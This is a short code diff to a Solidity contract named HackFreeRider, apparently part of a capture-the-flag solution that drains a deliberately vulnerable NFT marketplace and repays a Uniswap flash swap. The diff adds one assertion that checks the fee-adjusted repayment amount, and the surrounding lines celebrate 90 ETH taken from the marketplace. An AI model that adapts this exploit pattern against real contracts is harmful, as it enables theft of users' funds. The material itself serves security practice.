@@ -78,6 +78,7 @@ contract HackFreeRider {
         assert(address(this).balance == amount0 * 6); // we have gained 90 ETH from the marketplace :)
         // 1.3
         uint256 amount0Required = amount0.mul(1000).div(997) + 1; // amount0Required * (1 - 0.3%) = amount0
+        assert(amount0Required == 15045135406218655968);
         WETH.deposit{value: amount0Required}();
         WETH.transfer(address(pair), amount0Required);
     }
